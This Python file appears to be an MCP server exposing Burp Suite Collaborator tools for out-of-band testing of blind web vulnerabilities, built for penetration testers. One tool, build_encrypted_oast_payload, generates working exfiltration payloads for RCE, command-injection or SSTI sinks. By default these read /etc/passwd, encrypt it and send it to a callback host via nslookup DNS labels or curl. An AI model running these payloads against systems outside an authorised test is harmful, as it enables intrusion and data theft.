"""Tools for Burp Collaborator - out-of-band testing for blind vulnerabilities."""

import asyncio
import base64
import os
import re
from pathlib import Path

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


# --- Encrypted OAST (blind-exfil data protection) --------------------------
# When a blind-exfil payload smuggles data out over DNS/HTTP to a Collaborator
# (or operator callback), the OOB provider logs the *content* in cleartext. A
# local symmetric key lets the target encrypt the value client-side (before it
# hits the wire) so the provider only ever sees ciphertext; the operator
# decrypts locally. The key is target-visible (it rides in the injection
# payload) but never reaches the OOB provider — that is the threat model.
#
# Key lives under .burp-intel/_oast_key/ (already gitignored via .burp-intel/),
# dir 0700 / key 0600. Rule 9a is untouched: the real callback domain still
# comes from generate_collaborator_payload / an operator-provided callback —
# this layer only wraps the exfiltrated DATA.

_OAST_KEY_NAME = "fernet.key"


def _oast_key_dir() -> Path:
    return Path.cwd() / ".burp-intel" / "_oast_key"


def _get_oast_fernet():
    """Load-or-create the local OAST symmetric key.

    Returns (fernet, key_str, error). `error` is a non-empty operator-facing
    message when the `cryptography` package is missing or the key can't be
    persisted; in that case fernet is None.
    """
    try:
        from cryptography.fernet import Fernet
    except ImportError:
        return None, "", (
            "Encrypted OAST needs the `cryptography` package "
            "(uv pip install cryptography). Feature unavailable until installed."
        )
    key_dir = _oast_key_dir()
    key_path = key_dir / _OAST_KEY_NAME
    try:
        key_dir.mkdir(parents=True, exist_ok=True)
        os.chmod(key_dir, 0o700)
        if key_path.exists():
            key = key_path.read_bytes().strip()
        else:
            key = Fernet.generate_key()
            # O_CREAT with 0600 so the secret is never briefly world-readable.
            fd = os.open(str(key_path), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            with os.fdopen(fd, "wb") as fh:
                fh.write(key)
        os.chmod(key_path, 0o600)
        return Fernet(key), key.decode("ascii"), ""
    except (OSError, ValueError) as exc:
        return None, "", f"failed to load/create OAST key at {key_path}: {exc}"


def _b32_dns_encode(token: bytes) -> str:
    """DNS-label-safe encoding of a Fernet token (base32, unpadded, lowercased)."""
    return base64.b32encode(token).decode("ascii").rstrip("=").lower()


def _b32_dns_decode(text: str) -> bytes:
    cleaned = re.sub(r"[^a-zA-Z2-7]", "", text).upper()
    pad = (-len(cleaned)) % 8
    return base64.b32decode(cleaned + "=" * pad)


# R23: in-process Collaborator pool. Pre-generated subdomains live here
# so OOB-heavy scans (auto_probe, fuzz_parameter with Collaborator-bound
# payloads) can pull from cache instead of one round-trip per probe.
# Concurrent FastMCP tool calls would otherwise race on pop()/append().
_COLLAB_POOL: list[dict] = []
_COLLAB_POOL_LOCK: asyncio.Lock | None = None


def _pool_lock() -> asyncio.Lock:
    global _COLLAB_POOL_LOCK
    if _COLLAB_POOL_LOCK is None:
        _COLLAB_POOL_LOCK = asyncio.Lock()
    return _COLLAB_POOL_LOCK


def register(mcp: FastMCP):

    @mcp.tool()
    async def generate_collaborator_payload() -> str:
        """Generate a Burp Collaborator payload URL for out-of-band testing. Requires Burp Professional.

        For batched probing, prefer generate_collaborator_pool(count=N) once at
        session start, then pop_collaborator_payload() per probe (no round-trip).
        """
        # Pull from pool if available — saves a round-trip
        async with _pool_lock():
            entry = _COLLAB_POOL.pop(0) if _COLLAB_POOL else None
            remaining = len(_COLLAB_POOL)
        if entry is not None:
            return (
                f"Collaborator Payload (from pool, {remaining} left):\n"
                f"  Payload URL: {entry.get('payload', '')}\n"
                f"  Interaction ID: {entry.get('interaction_id', '')}\n"
                f"  Server: {entry.get('server', '')}\n\n"
                f"Inject this URL into target parameters, then use get_collaborator_interactions to check for hits."
            )
        data = await client.post("/api/collaborator/payload")
        if "error" in data:
            return f"Error: {data['error']}"

        return (
            f"Collaborator Payload Generated:\n"
            f"  Payload URL: {data.get('payload', '')}\n"
            f"  Interaction ID: {data.get('interaction_id', '')}\n"
            f"  Server: {data.get('server', '')}\n\n"
            f"Inject this URL into target parameters, then use get_collaborator_interactions to check for hits."
        )

    @mcp.tool()
    async def generate_collaborator_pool(count: int = 25) -> str:
        """Pre-generate a pool of Collaborator subdomains for batched OOB probing (R23).

        Generating one subdomain per probe is wasteful (1 round-trip each).
        Call this once at session start, then generate_collaborator_payload
        will consume from the pool until empty before falling back to network.

        Args:
            count: Number of subdomains to pre-generate (default 25, max 200)
        """
        count = max(1, min(200, count))
        # Fan out the allocations concurrently. Burp's Collaborator endpoint
        # is per-request idempotent and the extension's 24-thread pool absorbs
        # the burst easily; sequential allocation was the prior bottleneck
        # (25 calls × ~100ms ≈ 2.5s). asyncio.gather collapses to one batch.
        import asyncio as _asyncio
        results = await _asyncio.gather(
            *(client.post("/api/collaborator/payload") for _ in range(count)),
            return_exceptions=True,
        )
        added = 0
        errors = 0
        new_entries: list[dict] = []
        for data in results:
            if isinstance(data, Exception) or (isinstance(data, dict) and "error" in data):
                errors += 1
                # Burp Pro likely missing — bail early on a clear failure run
                # to avoid burning the whole batch on a pre-broken endpoint.
                if errors >= 3 and added == 0:
                    break
                continue
            new_entries.append({
                "payload": data.get("payload", ""),
                "interaction_id": data.get("interaction_id", ""),
                "server": data.get("server", ""),
            })
            added += 1
        async with _pool_lock():
            _COLLAB_POOL.extend(new_entries)
            total = len(_COLLAB_POOL)
        return (
            f"Collaborator pool: +{added} subdomains "
            f"(total now {total}, errors={errors})"
        )

    @mcp.tool()
    async def collaborator_pool_status() -> str:
        """Show how many Collaborator subdomains are pre-generated in the pool."""
        return f"Collaborator pool: {len(_COLLAB_POOL)} subdomains available."

    @mcp.tool()
    async def auto_collaborator_test(
        index: int,
        parameter: str,
        injection_point: str = "query",
        poll_seconds: int = 5,
    ) -> str:
        """Inject Collaborator payload into a parameter, send request, and poll for OOB interactions. Requires Burp Professional.

        Args:
            index: Proxy history index of the request to test
            parameter: Parameter name to inject the payload into
            injection_point: Where to inject — 'query', 'body', or 'header'
            poll_seconds: Seconds to wait before polling (default 5, max 15)
        """
        data = await client.post("/api/collaborator/auto-test", json={
            "index": index,
            "parameter": parameter,
            "injection_point": injection_point,
            "poll_seconds": poll_seconds,
        })
        if "error" in data:
            return f"Error: {data['error']}"

        vulnerable = data.get("vulnerable", False)
        interactions = data.get("interactions", [])

        lines = [f"Collaborator Auto-Test Results:\n"]
        lines.append(f"  Payload: {data.get('payload_injected', '')}")
        lines.append(f"  Parameter: {data.get('parameter', '')}")
        lines.append(f"  Injection Point: {data.get('injection_point', '')}")
        lines.append(f"  Response Status: {data.get('response_status', 'N/A')}")
        lines.append(f"  Poll Duration: {data.get('poll_seconds', 0)}s")
        lines.append("")

        if vulnerable:
            lines.append(f"[!!!] VULNERABLE - {len(interactions)} out-of-band interaction(s) detected!")
            lines.append("")
            for interaction in interactions:
                lines.append(f"  [{interaction.get('type')}] from {interaction.get('client_ip')}")
                lines.append(f"    Timestamp: {interaction.get('timestamp')}")
                lines.append("")
            lines.append("The target made external connections to the Collaborator server.")
            lines.append("This confirms a blind vulnerability (SSRF, XXE, SQLi, etc.).")
        else:
            lines.append("[OK] No interactions detected within the poll window.")
            lines.append("The target did not make out-of-band connections (or they were delayed).")
            lines.append("Consider increasing poll_seconds or testing other parameters.")

        return "\n".join(lines)

    @mcp.tool()
    async def build_encrypted_oast_payload(
        callback_domain: str,
        exfil_scheme: str = "dns",
        secret_expr: str = "open('/etc/passwd','rb').read()",
        sample_value: str = "",
    ) -> str:
        """Build a blind-exfil OAST payload that encrypts the leaked DATA with a
        local key before it hits the wire, so the OOB provider (Collaborator /
        interact.sh) only ever logs ciphertext.

        The real callback domain MUST come from generate_collaborator_payload
        (Burp Pro) or an operator-provided callback (interact.sh / webhook.site).
        This tool never fabricates one — pass the subdomain you obtained.

        Threat model: the symmetric key rides inside the injection payload (the
        target needs it to encrypt) but never reaches the OOB provider, which
        sees only the callback traffic. The operator decrypts captures locally
        with decrypt_oast_capture. Use in contexts where the target can run the
        encrypt step (RCE / command injection / SSTI).

        Args:
            callback_domain: real Collaborator/callback subdomain (NOT fabricated)
            exfil_scheme: 'dns' (base32 labels) or 'http' (query param)
            secret_expr: target-side Python expression returning the secret bytes
            sample_value: optional plaintext to also render as the exact on-wire
                          ciphertext, so the operator can verify the round trip
        """
        if not callback_domain or not callback_domain.strip():
            return (
                "Error: no callback_domain. Rule 9a — never fabricate a callback. "
                "Call generate_collaborator_payload() first (Burp Pro), or supply "
                "your own interact.sh / webhook.site subdomain, then pass it here."
            )
        callback = callback_domain.strip()
        scheme = exfil_scheme.strip().lower()
        if scheme not in ("dns", "http"):
            return f"Error: exfil_scheme must be 'dns' or 'http', got {exfil_scheme!r}"

        fernet, key_str, err = _get_oast_fernet()
        if err:
            return f"Error: {err}"

        lines = [
            "Encrypted OAST Payload (data encrypted client-side; provider sees ciphertext):",
            f"  Callback:   {callback}",
            f"  Scheme:     {scheme}",
            f"  Local key:  {_oast_key_dir() / _OAST_KEY_NAME} (0600)",
            "",
        ]

        if scheme == "dns":
            lines += [
                "Target-side encrypt + DNS exfil (drop into an RCE/CMDi/SSTI sink):",
                "```",
                "python3 - <<'PY'",
                "from cryptography.fernet import Fernet",
                "import base64, os",
                f"KEY = {key_str!r}.encode()",
                f"secret = {secret_expr}",
                "tok = base64.b32encode(Fernet(KEY).encrypt(secret)).decode().rstrip('=').lower()",
                f"host = {callback!r}",
                "for i in range(0, len(tok), 60):",
                "    os.system('nslookup %s.%s' % (tok[i:i+60], host))",
                "PY",
                "```",
                "",
                "Capture the DNS labels via get_collaborator_interactions, concatenate",
                "them, then decrypt_oast_capture(<concatenated-labels>).",
            ]
        else:  # http
            lines += [
                "Target-side encrypt + HTTP exfil (query param carries the token):",
                "```",
                'curl -s "http://%s/x?d=$(python3 -c "'
                "from cryptography.fernet import Fernet;"
                f"print(Fernet({key_str!r}.encode()).encrypt({secret_expr}).decode())"
                '")"' % callback,
                "```",
                "",
                "Capture the ?d= value via get_collaborator_interactions, then",
                "decrypt_oast_capture(<token>).",
            ]

        if sample_value:
            token = fernet.encrypt(sample_value.encode("utf-8"))
            if scheme == "dns":
                wire = _b32_dns_encode(token)
            else:
                wire = token.decode("ascii")
            lines += [
                "",
                "Round-trip check (sample_value encrypted with the local key):",
                f"  On-wire ciphertext: {wire}",
                "  Verify with decrypt_oast_capture(<the string above>).",
            ]

        return "\n".join(lines)

    @mcp.tool()
    async def decrypt_oast_capture(ciphertext: str) -> str:
        """Decrypt an OAST capture (ciphertext observed at the Collaborator /
        callback) using the local OAST key. Operator-side counterpart to
        build_encrypted_oast_payload.

        Accepts either a raw Fernet token (HTTP exfil) or concatenated base32
        DNS labels (DNS exfil) — dots/whitespace are stripped automatically.

        Args:
            ciphertext: the captured on-wire ciphertext string
        """
        if not ciphertext or not ciphertext.strip():
            return "Error: empty ciphertext."
        fernet, _key_str, err = _get_oast_fernet()
        if err:
            return f"Error: {err}"

        from cryptography.fernet import InvalidToken

        raw = ciphertext.strip()
        # Attempt 1: raw Fernet token (HTTP scheme / urlsafe-base64).
        try:
            plain = fernet.decrypt(raw.encode("ascii"))
            return f"Decrypted ({len(plain)} bytes):\n{plain.decode('utf-8', errors='replace')}"
        except (InvalidToken, ValueError, UnicodeEncodeError):
            pass
        # Attempt 2: base32 DNS labels.
        try:
            token = _b32_dns_decode(raw)
            plain = fernet.decrypt(token)
            return f"Decrypted ({len(plain)} bytes):\n{plain.decode('utf-8', errors='replace')}"
        except (InvalidToken, ValueError, base64.binascii.Error):
            return (
                "Error: decryption failed. Ciphertext is not a valid Fernet token "
                "for the current local key (wrong key, corrupted capture, or "
                "partial DNS labels). Confirm all labels were captured."
            )

    @mcp.tool()
    async def get_collaborator_interactions() -> str:
        """Check for Collaborator interactions (DNS, HTTP, SMTP). Presence confirms blind vulnerabilities. Requires Burp Professional."""
        data = await client.get("/api/collaborator/interactions")
        if "error" in data:
            return f"Error: {data['error']}"

        interactions = data.get("interactions", [])
        total = data.get("total", 0)

        if not interactions:
            return "No collaborator interactions detected yet. The target may not have triggered the payload."

        lines = [f"Collaborator Interactions ({total} total):\n"]
        for interaction in interactions:
            itype = interaction.get('type', '?')
            lines.append(f"  [{itype}] from {interaction.get('client_ip')}")
            lines.append(f"    Timestamp: {interaction.get('timestamp')}")
            lines.append(f"    Payload ID: {interaction.get('payload_id')}")

            # HTTP callback details (blind SSRF/XXE evidence)
            http = interaction.get("http_details", {})
            if http:
                lines.append(f"    HTTP: {http.get('method', '?')} {http.get('path', '/')}")
                body = http.get("request_body", "")
                if body:
                    lines.append(f"    Body: {body[:200]}")

            # DNS exfiltration details
            dns = interaction.get("dns_details", {})
            if dns:
                lines.append(f"    DNS: {dns.get('query_type', '?')} — {dns.get('description', '')}")

            lines.append("")

        return "\n".join(lines)
